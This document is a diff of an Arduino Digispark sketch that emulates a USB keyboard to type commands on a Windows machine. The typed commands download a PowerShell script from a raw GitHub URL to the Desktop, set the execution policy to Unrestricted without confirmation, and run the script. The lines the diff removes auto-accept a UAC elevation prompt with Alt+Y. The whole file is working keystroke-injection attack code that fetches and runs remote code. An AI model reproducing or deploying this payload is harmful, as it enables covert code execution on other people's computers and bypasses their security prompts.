@@ -15,13 +15,13 @@ void loop() {
     DigiKeyboard.println("$client.DownloadFile(\"https://raw.githubusercontent.com/villecaribas/InstallPatrulino/master/downlino.ps1\" , \"$env:userprofile/Desktop/installLino.ps1\")");
 
     // If the system hasn't been configured to run scripts, uncomment the lines bellow
-    DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
-    // DigiKeyboard.sendKeyStroke(KEY_ENTER);exit
-
-    DigiKeyboard.delay(750);
-    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-    DigiKeyboard.delay(3000);
-    DigiKeyboard.print("powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Confirm:$false");
+    // DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
+    
+    // DigiKeyboard.delay(750);
+    // DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+    DigiKeyboard.delay(5000);
+    DigiKeyboard.println("Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Confirm:$false");
+    DigiKeyboard.print("S");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(750);
 
@@ -30,13 +30,9 @@ void loop() {
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
     DigiKeyboard.delay(500);
-    DigiKeyboard.print("powershell %USERPROFILE%\\Desktop\\installLino.ps1");
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.println("powershell $env:USERPROFILE\\Desktop\\installLino.ps1");
+    // DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(1000);
-
-    DigiKeyboard.println("exit");
-    DigiKeyboard.delay(500);
-    DigiKeyboard.println("exit");
 
     for (;;)
         ;
